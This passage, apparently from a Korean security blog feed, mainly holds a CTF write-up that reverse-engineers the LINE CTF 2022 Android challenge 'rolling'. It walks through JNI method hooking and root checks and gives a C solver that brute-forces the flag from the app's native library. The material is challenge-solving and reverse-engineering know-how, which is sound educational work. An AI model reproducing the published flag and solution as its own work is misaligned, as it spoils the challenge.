<li>기술 면접에 가까운 성격을 고려할 때, 수사법으로 열정을 강조하는 대신 나는 이런 사람이고, 이런 경험을 했고, 이런 걸 느끼고 배웠으며, 앞으로 이런 일을 하고 싶어 지원했다는 내용을 담담히 이야기하는 것이 좋겠습니다.</li>
<li>저는 내용을 외우고 발표하는 편이 강약을 주거나 감정을 조절할 때 도움이 되었습니다.</li>
</ul>
</li>
<li>제가 입장한 면접실은 멘토님 두 분에 지원자 세 명이 입장했습니다.</li>
<li>저는 대부분 “~를 공부했다고 했는데 ~를 아느냐”, &quot;~에 대해 설명해보아라&quot;와 같은 질문을 받았습니다.
<ul>
<li>IE 1-day를 공부했다는 내용에서 &quot;IE의 MemGC 보호 기법에 대해 학습했느냐&quot;는 질문을 받았는데, 솔직하게 처음 들어본다고 말씀드렸더니 다음 질문으로 넘어가셨습니다.</li>
</ul>
</li>
<li>제가 받은 질문의 경우 대부분 자기소개서와 3분 자기소개에서 겹치는 소재에 대한 내용을 물어보셨습니다.</li>
<li>따라서 서류나 자기소개에 강조한 내용에 대해서는 예상 질문을 스스로 만들어 보시고 대비하는 것이 좋을 것 같습니다.</li>
</ul>
<p>합격 이후 마음을 추스리고 정리해 보았는데, 많은 분들께 도움이 되었으면 좋겠습니다. 글 내용과 관련된 질문은 댓글이나 연락 주시면 상세히 답변드리겠습니다. 마지막으로 BoB 지원의 전 과정에서 전폭적으로 도움을 받았던 고려대학교 이희조 교수님과 김영훈 선배, 그리고 응원해주신 모든 분들께 감사드립니다.</p>
<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/katex/dist/katex.min.css">
<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/markdown-it-texmath/css/texmath.min.css">
]]></content>
      <categories>
        <category>Thoughts</category>
      </categories>
  </entry>
  <entry>
    <title>[LINE CTF 2022] rolling</title>
    <url>/2022/08/28/line22-rolling/</url>
    <content><![CDATA[<h1 id="%EA%B0%9C%EC%9A%94" tabindex="-1">개요</h1>
<blockquote>
<p>what you know about rolling?</p>
</blockquote>
<p><a href="/uploads/line22-rolling/rolling.apk">rolling.apk</a></p>
<h2 id="%EB%AC%B8%EC%A0%9C-%EB%B6%84%EC%84%9D" tabindex="-1">문제 분석</h2>
<blockquote class="callout-warning">
    <p>
    <strong>주의사항</strong><br>
    이 글의 내용을 따라하기 위해서는 Aarch64 아키텍처 기반의 안드로이드 장치가 필요합니다. 
    </p>
</blockquote>
<p>안드로이드 APK 파일 <code>rolling.apk</code> 가 주어집니다. ADB를 이용하여 안드로이드 장치에 설치한 후 실행하면 그림과 같이 <code>EditText</code> 위젯과 버튼이 있는데, 아무 텍스트나 입력하고 버튼을 누르면 앱이 강제종료됩니다.</p>
<p><img src="/images/line22-rolling/1.png" alt="1.png"></p>
<p>런처 액티비티인 <code>MainActivity</code> 의 디컴파일 결과를 보면 10행에 <code>checkFlag</code> 메소드, 19행에 <code>deep</code> 네이티브 메소드가 선언되어 있습니다. <code>checkFlag</code> 메소드는 위의 화면에서 버튼을 누르면 호출되는 메소드입니다. 이 메소드는 <code>EditText</code> 위젯에 특정 URL을 입력하면 “Correct! :)” 문자열을 출력하는데, 그렇다고 플래그를 주는 것은 아닙니다.</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> me.linectf.app;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainActivity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        System.loadLibrary(<span class="string">&quot;native-lib&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">checkFlag</span><span class="params">(View arg6)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(((EditText)<span class="built_in">this</span>.findViewById(<span class="number">0x7F08006D</span>)).getText().toString() == <span class="string">&quot;IINECFT&#123;youtube.com/watch?v=dQw4w9WgXcQ&#125;&quot;</span>) &#123;  <span class="comment">// id:editText</span></span><br><span class="line">            Toast.makeText(<span class="built_in">this</span>, <span class="string">&quot;Correct! :)&quot;</span>, <span class="number">1</span>).show();</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Toast.makeText(arg6.getContext(), <span class="string">&quot;Wrong! :(&quot;</span>, <span class="number">1</span>).show();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">native</span> <span class="keyword">void</span> <span class="title function_">deep</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span>  <span class="comment">// androidx.appcompat.app.AppCompatActivity</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle arg2)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(arg2);</span><br><span class="line">        <span class="built_in">this</span>.setContentView(<span class="number">0x7F0B001C</span>);  <span class="comment">// layout:activity_main</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>APK 파일에서 <code>lib/arm64-v8a</code> 경로에는 64비트 Aarch64 라이브러리인 <code>libnative-lib.so</code> 파일이 있습니다. 안드로이드 앱은 JNI(Java Native Interface)를 이용해 Java로 작성된 앱 코드에서 C/C++로 작성된 네이티브 라이브러리를 불러오고 코드를 실행할 수 있습니다. 이 파일은 앱에서 불러오는 네이티브 라이브러리에 해당하는 것입니다. 앞서 <code>MainActivity</code> 에서 <code>System.loadLibrary</code> 를 호출하여 라이브러리를 불러오면 <code>JNI_OnLoad</code> 함수가 호출됩니다. 이 함수를 살펴보면 7행에서 라이브러리의 <code>deep</code> 함수를 앱에서 호출할 수 있는 네이티브 메소드로 등록하고 있습니다.</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">jint <span class="title function_">JNI_OnLoad</span><span class="params">(JavaVM *vm, <span class="type">void</span> *reserved)</span></span><br><span class="line">&#123;</span><br><span class="line">  ...</span><br><span class="line">  (*vm)-&gt;GetEnv(vm, (<span class="type">void</span> **)&amp;env, <span class="number">65542LL</span>);</span><br><span class="line">  c = (*env)-&gt;FindClass(env, <span class="string">&quot;me/linectf/app/MainActivity&quot;</span>);</span><br><span class="line">  (*env)-&gt;GetObjectClass(env, c);</span><br><span class="line">  (*env)-&gt;RegisterNatives(env, c, methods, <span class="number">1LL</span>);<span class="comment">// JNINativeMethod methods[] = &#123;</span></span><br><span class="line">                                                <span class="comment">//     &quot;deep&quot;, &quot;()V&quot;, reintepret_cast&lt;void*&gt;(deep)</span></span><br><span class="line">                                                <span class="comment">// &#125;;</span></span><br><span class="line">  v3 = (*env)-&gt;GetMethodID(env, c, <span class="string">&quot;checkFlag&quot;</span>, <span class="string">&quot;(Landroid/view/View;)V&quot;</span>);</span><br><span class="line">  v4 = (*env)-&gt;GetMethodID(env, c, <span class="string">&quot;deep&quot;</span>, <span class="string">&quot;()V&quot;</span>);</span><br><span class="line">  v5 = (*env)-&gt;ToReflectedMethod(env, c, v3, <span class="number">0LL</span>);</span><br><span class="line">  v6 = (*env)-&gt;ToReflectedMethod(env, c, v4, <span class="number">0LL</span>);</span><br><span class="line">  v7 = (*env)-&gt;FindClass(env, <span class="string">&quot;java/lang/reflect/Executable&quot;</span>);</span><br><span class="line">  v8 = (*env)-&gt;GetFieldID(env, v7, <span class="string">&quot;artMethod&quot;</span>, <span class="string">&quot;J&quot;</span>);</span><br><span class="line">  v9 = (<span class="type">unsigned</span> <span class="type">int</span> *)(*env)-&gt;GetLongField(env, v5, v8);</span><br><span class="line">  v10 = (<span class="type">unsigned</span> <span class="type">int</span> *)(*env)-&gt;GetLongField(env, v6, v8);</span><br><span class="line">  v11 = *v9;</span><br><span class="line">  v12 = *v10;</span><br><span class="line">  *(_DWORD *)((<span class="type">char</span> *)&amp;qword_58 + v12) = *(_DWORD *)((<span class="type">char</span> *)&amp;qword_58 + v11);</span><br><span class="line">  *(_DWORD *)(v12 + <span class="number">120</span>) = *(_DWORD *)(v11 + <span class="number">120</span>);</span><br><span class="line">  *v9 = v12;</span><br><span class="line">  v9[<span class="number">1</span>] = v10[<span class="number">1</span>] | <span class="number">1</span>;</span><br><span class="line">  v9[<span class="number">2</span>] = v10[<span class="number">2</span>];</span><br><span class="line">  *((_WORD *)v9 + <span class="number">9</span>) = *((_WORD *)v10 + <span class="number">9</span>);</span><br><span class="line">  *(_OWORD *)(v9 + <span class="number">6</span>) = *(_OWORD *)(v10 + <span class="number">6</span>);</span><br><span class="line">  *((_QWORD *)v9 + <span class="number">5</span>) = *((_QWORD *)v10 + <span class="number">5</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">65542</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>그런데 10행 이후의 코드를 보면 <code>GetMethodID</code> , <code>ToReflectedMethod</code> 등 JNI 함수들을 이용한 추가적인 작업을 하고 있습니다. 여기서 <code>ToReflectedMethod</code> 함수는 안드로이드 NDK <a href="https://github.com/android/ndk/wiki/JNI#jnienv">위키</a>를 보면 Java 리플렉션(reflection)과의 상호작용을 위한 함수라고 명시되어 있습니다. 리플렉션은 런타임에 객체의 멤버들에 대한 정보를 조회하고 조작할 수 있는 Java 언어의 기능입니다. 이를 참고할 때, 리플렉션을 이용해 <code>checkFlag</code> 의 <code>artMethod</code> 값을 <code>deep</code> 의 값으로 덮어씌워 런타임에 <code>checkFlag</code> 메소드를 호출하면 <code>deep</code> 네이티브 메소드가 호출되도록 조작하고 있음을 추측할 수 있습니다.</p>
<p>라이브러리에서 <code>deep</code> 함수를 살펴보면 <code>MainActivity</code> 의 <code>EditText</code> 위젯에 입력된 문자열을 가져와 반복문을 실행합니다. 반복문은 문자열 내의 각 문자 <code>s[i]</code> 에 대해 <code>meatbox</code> , <code>soulbox</code> , <code>godbox</code> 함수를 실행하여 결과가 각각 <code>data[i]</code> , <code>data[i + 1]</code> , <code>data[i + 2]</code> 와 모두 같은지 검사합니다. 모든 문자에 대해 검사를 통과하면 “Correct! :)” 를 출력합니다. 따라서 이를 만족하는 문자열이 플래그라고 짐작할 수 있습니다.</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">deep</span><span class="params">(JNIEnv *env, __int64 a2, __int64 a3)</span></span><br><span class="line">&#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">if</span> ( (stat(<span class="string">&quot;/bin/su&quot;</span>, (<span class="keyword">struct</span> stat *)v51) &amp; <span class="number">0x80000000</span>) != <span class="number">0</span></span><br><span class="line">      &amp;&amp; (stat(<span class="string">&quot;/bin/magisk&quot;</span>, (<span class="keyword">struct</span> stat *)v51) &amp; <span class="number">0x80000000</span>) != <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v50 = v19;</span><br><span class="line">      v27 = (*env)-&gt;FindClass(env, <span class="string">&quot;me/linectf/app/R$id&quot;</span>);</span><br><span class="line">      v28 = (*env)-&gt;GetStaticFieldID(env, v27, <span class="string">&quot;editText&quot;</span>, <span class="string">&quot;I&quot;</span>);</span><br><span class="line">      (*env)-&gt;GetStaticIntField(env, v27, v28);</span><br><span class="line">      v29 = (*env)-&gt;FindClass(env, <span class="string">&quot;me/linectf/app/MainActivity&quot;</span>);</span><br><span class="line">      v30 = (*env)-&gt;GetMethodID(env, v29, <span class="string">&quot;findViewById&quot;</span>, <span class="string">&quot;(I)Landroid/view/View;&quot;</span>);</span><br><span class="line">      v31 = _JNIEnv::CallObjectMethod(env, a2, v30);</span><br><span class="line">      v32 = (*env)-&gt;FindClass(env, <span class="string">&quot;android/widget/EditText&quot;</span>);</span><br><span class="line">      v33 = (*env)-&gt;GetMethodID(env, v32, <span class="string">&quot;getText&quot;</span>, <span class="string">&quot;()Landroid/text/Editable;&quot;</span>);</span><br><span class="line">      v34 = _JNIEnv::CallObjectMethod(env, v31, v33);</span><br><span class="line">      v35 = (*env)-&gt;FindClass(env, <span class="string">&quot;android/text/Editable&quot;</span>);</span><br><span class="line">      v36 = (*env)-&gt;GetMethodID(env, v35, <span class="string">&quot;toString&quot;</span>, <span class="string">&quot;()Ljava/lang/String;&quot;</span>);</span><br><span class="line">      v37 = (<span class="type">void</span> *)_JNIEnv::CallObjectMethod(env, v34, v36);</span><br><span class="line">      s = (*env)-&gt;GetStringUTFChars(env, v37, <span class="number">0LL</span>);</span><br><span class="line">      j = <span class="number">0</span>;</span><br><span class="line">      i = <span class="number">0LL</span>;</span><br><span class="line">      failed = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">while</span> ( <span class="built_in">strlen</span>(s) &gt; i )</span><br><span class="line">      &#123;</span><br><span class="line">        sub_3C48(buf, v42, v43, v44, (<span class="type">unsigned</span> __int8)s[i]);<span class="comment">// vsnprintf(buf, 2, &quot;%c&#x27;, s[i])</span></span><br><span class="line">        v45 = (<span class="type">unsigned</span> __int8 *)meatbox(buf);</span><br><span class="line">        v46 = (<span class="type">unsigned</span> __int8 *)soulbox(buf);</span><br><span class="line">        v47 = (<span class="type">unsigned</span> __int8 *)godbox(buf);</span><br><span class="line">        <span class="keyword">if</span> ( data[j] != *v45 || data[j + <span class="number">1</span>] != *v46 || data[j + <span class="number">2</span>] != *v47 )</span><br><span class="line">          failed = <span class="number">1</span>;</span><br><span class="line">        ++i;</span><br><span class="line">        j += <span class="number">3</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( failed == <span class="number">1</span> || <span class="built_in">strlen</span>(s) &lt;= <span class="number">50uLL</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v48 = *env;</span><br><span class="line">        v49 = <span class="string">&quot;Wrong! :(&quot;</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        v48 = *env;</span><br><span class="line">        v49 = <span class="string">&quot;Correct! :)&quot;</span>;</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure>
<h2 id="%EB%AC%B8%EC%A0%9C-%ED%92%80%EC%9D%B4" tabindex="-1">문제 풀이</h2>
<p>플래그를 얻기 위해서는 라이브러리에 구현된 <code>meatbox</code> , <code>soulbox</code> , <code>godbox</code> 함수의 인자로 전달했을 때 결과가 <code>data</code> 배열의 값들과 일치하는 문자열을 구해야 합니다. 그런데 이들 함수의 구현은 매우 복잡하여 분석이 쉽지 않습니다. 라이브러리 또한 안드로이드 NDK로 컴파일된 라이브러리로 일반적인 Aarch64 환경에서 동적 분석을 시도하여도 의존성 문제로 인해 로딩조차 되지 않습니다. 따라서 해당 라이브러리를 동적으로 로딩하여 <code>meatbox</code> , <code>soulbox</code> , <code>godbox</code> 함수를 호출하는 C 코드를 작성하고, 안드로이드 NDK로 컴파일한 후 Aarch64 기반의 안드로이드 장치에서 실행하도록 하겠습니다.</p>
<p>안드로이드 NDK는 C/C++로 작성한 코드를 안드로이드에서 실행 가능하도록 하는 빌드 도구입니다. 안드로이드 통합 개발 환경인 안드로이드 스튜디오(Android Studio)의 SDK Manager 메뉴에서 다음과 같이 설치할 수 있습니다.</p>
<p><img src="/images/line22-rolling/2.png" alt="2.png"></p>
<p>안드로이드 NDK 설치 경로의 clang 컴파일러를 이용해 소스 코드를 컴파일하고, ADB를 이용하여 바이너리를 장치에 전송하는 빌드 스크립트를 다음과 같이 작성하였습니다. 설치 경로는 운영체제에 따라 서로 다를 수 있습니다.</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/usr/bin/env bash</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># add to terminal PATH variable</span></span><br><span class="line"><span class="built_in">export</span> PATH=<span class="string">&quot;<span class="variable">$HOME</span>/Library/Android/sdk/ndk/25.1.8937393/toolchains/llvm/prebuilt/darwin-x86_64/bin:<span class="variable">$PATH</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># make alias CC to be the new clang binary</span></span><br><span class="line"><span class="built_in">export</span> CC=aarch64-linux-android29-clang</span><br><span class="line"></span><br><span class="line"><span class="variable">$CC</span> main.c -o main</span><br><span class="line"></span><br><span class="line"><span class="comment"># push compiled binary to android</span></span><br><span class="line">adb push main /data/local/tmp</span><br></pre></td></tr></table></figure>
<p>라이브러리를 로드할 때 유의할 점은 해당 라이브러리는 C++로 작성되어, 함수 이름이 맹글링(mangling)되어 있다는 것입니다. <code>readelf</code> 를 사용해 라이브러리에서 심볼을 조회하면 <code>meatbox</code> , <code>soulbox</code> , <code>godbox</code> 함수들의 맹글링된 이름을 확인할 수 있습니다. 함수를 불러올 때는 이 이름들을 사용해야 합니다.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ readelf -s .\libnative-lib.so | grep &quot;box&quot;</span><br><span class="line">    ...</span><br><span class="line">    21: 0000000000001708  1040 FUNC    GLOBAL DEFAULT   10 _Z7meatboxPc</span><br><span class="line">    ...</span><br><span class="line">    28: 000000000000314c  1044 FUNC    GLOBAL DEFAULT   10 _Z6godboxPc</span><br><span class="line">    ...</span><br><span class="line">    35: 0000000000002428  1040 FUNC    GLOBAL DEFAULT   10 _Z7soulboxPc</span><br></pre></td></tr></table></figure>
<p>풀이 코드는 <code>dlopen</code> 과 <code>dlsym</code> 함수를 이용해 동적으로 라이브러리를 불러오고 <code>meatbox</code> , <code>soulbox</code> , <code>godbox</code> 함수를 찾아 함수 포인터에 대입합니다. 이후 모든 출력 가능한 ASCII 범위의 문자에 대해 각각의 함수들을 호출하여 결과를 미리 <code>map</code> 배열에 저장합니다. <code>data</code> 배열의 값들과 결과가 일치하는 문자를 <code>map</code> 배열에서 조회하여 플래그를 구할 수 있도록 하였습니다. 안드로이드 장치에 바이너리를 전송하고 실행하면 플래그를 확인할 수 있습니다.</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;dlfcn.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> *(*meatbox)(<span class="type">char</span> *);</span><br><span class="line"><span class="type">char</span> *(*soulbox)(<span class="type">char</span> *);</span><br><span class="line"><span class="type">char</span> *(*godbox)(<span class="type">char</span> *);</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> data[<span class="number">153</span>] = &#123; <span class="number">7</span>, <span class="number">24</span>, <span class="number">16</span>, <span class="number">15</span>, <span class="number">28</span>, <span class="number">18</span>, <span class="number">5</span>, <span class="number">10</span>, <span class="number">7</span>, <span class="number">11</span>, <span class="number">2</span>, <span class="number">15</span>, <span class="number">18</span>, <span class="number">6</span>, <span class="number">8</span>, <span class="number">19</span>, <span class="number">10</span>, <span class="number">7</span>, <span class="number">5</span>, <span class="number">9</span>, <span class="number">11</span>, <span class="number">6</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">17</span>, <span class="number">4</span>, <span class="number">19</span>, <span class="number">19</span>, <span class="number">1</span>, <span class="number">14</span>, <span class="number">3</span>, <span class="number">11</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">2</span>, <span class="number">8</span>, <span class="number">19</span>, <span class="number">1</span>, <span class="number">14</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">12</span>, <span class="number">9</span>, <span class="number">5</span>, <span class="number">16</span>, <span class="number">1</span>, <span class="number">18</span>, <span class="number">10</span>, <span class="number">8</span>, <span class="number">11</span>, <span class="number">18</span>, <span class="number">17</span>, <span class="number">4</span>, <span class="number">19</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">12</span>, <span class="number">19</span>, <span class="number">1</span>, <span class="number">14</span>, <span class="number">18</span>, <span class="number">0</span>, <span class="number">14</span>, <span class="number">8</span>, <span class="number">11</span>, <span class="number">18</span>, <span class="number">1</span>, <span class="number">15</span>, <span class="number">11</span>, <span class="number">3</span>, <span class="number">11</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">12</span>, <span class="number">7</span>, <span class="number">5</span>, <span class="number">4</span>, <span class="number">8</span>, <span class="number">11</span>, <span class="number">18</span>, <span class="number">8</span>, <span class="number">24</span>, <span class="number">15</span>, <span class="number">8</span>, <span class="number">24</span>, <span class="number">15</span>, <span class="number">14</span>, <span class="number">28</span>, <span class="number">15</span>, <span class="number">1</span>, <span class="number">18</span>, <span class="number">10</span>, <span class="number">16</span>, <span class="number">21</span>, <span class="number">17</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">12</span>, <span class="number">6</span>, <span class="number">22</span>, <span class="number">10</span>, <span class="number">8</span>, <span class="number">11</span>, <span class="number">18</span>, <span class="number">17</span>, <span class="number">4</span>, <span class="number">19</span>, <span class="number">1</span>, <span class="number">18</span>, <span class="number">10</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">12</span>, <span class="number">14</span>, <span class="number">28</span>, <span class="number">15</span>, <span class="number">1</span>, <span class="number">18</span>, <span class="number">10</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">12</span>, <span class="number">3</span>, <span class="number">11</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">2</span>, <span class="number">8</span>, <span class="number">4</span>, <span class="number">13</span>, <span class="number">16</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">12</span>, <span class="number">6</span>, <span class="number">22</span>, <span class="number">10</span>, <span class="number">4</span>, <span class="number">13</span>, <span class="number">16</span>, <span class="number">4</span>, <span class="number">13</span>, <span class="number">16</span>, <span class="number">17</span>, <span class="number">15</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">23</span>, <span class="number">2</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">setup</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">void</span> *handle;</span><br><span class="line">    <span class="type">char</span> *error;</span><br><span class="line">    <span class="type">char</span> <span class="built_in">map</span>[<span class="number">256</span>][<span class="number">3</span>];</span><br><span class="line"></span><br><span class="line">    handle = dlopen(<span class="string">&quot;./libnative-lib.so&quot;</span>, RTLD_LAZY);</span><br><span class="line">    <span class="keyword">if</span> (!handle) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, dlerror());</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    dlerror();</span><br><span class="line"></span><br><span class="line">    meatbox = (<span class="type">char</span> *(*)(<span class="type">char</span> *)) dlsym(handle, <span class="string">&quot;_Z7meatboxPc&quot;</span>);</span><br><span class="line">    error = dlerror();</span><br><span class="line">    <span class="keyword">if</span> (error != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, error);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    soulbox = (<span class="type">char</span> *(*)(<span class="type">char</span> *)) dlsym(handle, <span class="string">&quot;_Z7soulboxPc&quot;</span>);</span><br><span class="line">    error = dlerror();</span><br><span class="line">    <span class="keyword">if</span> (error != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, error);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    godbox = (<span class="type">char</span> *(*)(<span class="type">char</span> *)) dlsym(handle, <span class="string">&quot;_Z6godboxPc&quot;</span>);</span><br><span class="line">    error = dlerror();</span><br><span class="line">    <span class="keyword">if</span> (error != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, error);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">2</span>] = &#123; <span class="string">&#x27;\0&#x27;</span> &#125;;</span><br><span class="line">    <span class="type">char</span> <span class="built_in">map</span>[<span class="number">256</span>][<span class="number">3</span>];           <span class="comment">// meatbox, soulbox, godbox</span></span><br><span class="line">    <span class="type">char</span> flag[<span class="number">64</span>] = &#123; <span class="string">&#x27;\0&#x27;</span> &#125;;</span><br><span class="line"></span><br><span class="line">    setup();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0x20</span>; i &lt; <span class="number">0x7f</span>; i++) &#123;</span><br><span class="line">        buf[<span class="number">0</span>] = (<span class="type">char</span>) i;</span><br><span class="line">        <span class="built_in">map</span>[i][<span class="number">0</span>] = meatbox(buf)[<span class="number">0</span>];</span><br><span class="line">        <span class="built_in">map</span>[i][<span class="number">1</span>] = soulbox(buf)[<span class="number">0</span>];</span><br><span class="line">        <span class="built_in">map</span>[i][<span class="number">2</span>] = godbox(buf)[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">51</span>; i++) &#123;</span><br><span class="line">        <span class="type">char</span> m = data[i * <span class="number">3</span>];</span><br><span class="line">        <span class="type">char</span> s = data[i * <span class="number">3</span> + <span class="number">1</span>];</span><br><span class="line">        <span class="type">char</span> g = data[i * <span class="number">3</span> + <span class="number">2</span>];</span><br><span class="line">        <span class="type">int</span> found = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0x20</span>; j &lt; <span class="number">0x7f</span>; j++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">map</span>[j][<span class="number">0</span>] == m</span><br><span class="line">                    &amp;&amp; <span class="built_in">map</span>[j][<span class="number">1</span>] == s</span><br><span class="line">                    &amp;&amp; <span class="built_in">map</span>[j][<span class="number">2</span>] == g</span><br><span class="line">            ) &#123;</span><br><span class="line">                flag[i] = (<span class="type">char</span>) j;</span><br><span class="line">                found = <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!found) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;fail!\n&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, flag);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ adb shell</span><br><span class="line">beyond1:/ $ cd /data/local/tmp</span><br><span class="line">beyond1:/data/local/tmp $ ./main</span><br><span class="line">LINECTF&#123;watcha_kn0w_ab0ut_r0ll1ng_d0wn_1n_th3_d33p&#125;</span><br></pre></td></tr></table></figure>
<h2 id="%EC%B0%B8%EA%B3%A0%EC%9E%90%EB%A3%8C" tabindex="-1">참고자료</h2>
<p>[1] <em>JNI Functions</em>, Java Native Interface Specification, 2019. [Online] Available: <a href="https://docs.oracle.com/javase/8/docs/technotes/guides/jni/spec/jniTOC.html">https://docs.oracle.com/javase/8/docs/technotes/guides/jni/spec/jniTOC.html</a></p>
<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/katex/dist/katex.min.css">
<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/markdown-it-texmath/css/texmath.min.css">
]]></content>
      <categories>
        <category>Security</category>
        <category>CTF</category>
      </categories>
  </entry>
  <entry>
    <title>[LINE CTF 2022] trust_code</title>
    <url>/2022/07/30/line22-trust-code/</url>
    <content><![CDATA[<h2 id="%EA%B0%9C%EC%9A%94" tabindex="-1">개요</h2>
<p><a href="/uploads/line22-trust-code/chall.zip">chall.zip</a></p>
<h2 id="%EB%AC%B8%EC%A0%9C-%EB%B6%84%EC%84%9D" tabindex="-1">문제 분석</h2>
<blockquote class="callout-warning">
    <p>
    <strong>주의사항</strong><br>
    이 글의 내용을 이해하기 위해서는 C++ 예외 처리의 <a href="/2022/07/17/cpp-exception-handling/">내부 구현</a>에 대한 지식이 필요합니다.
    </p>
</blockquote>
<p>64비트 x86_64 바이너리 <code>trust_code</code> 와 <code>Dockerfile</code> 등이 주어집니다. <code>Dockerfile</code> 을 비롯한 컨테이너 관련 파일은 원본 문제에는 없는 파일로, 대회 환경을 구현하기 위해 작성하였습니다. <code>secret_key.txt</code> 는 서버에만 있어야 하는 파일로, 대회 참가자에게 배포되지 않습니다. 바이너리는 심볼이 있고, Canary, NX, PIE 보호 기법이 적용되어 있습니다.</p>
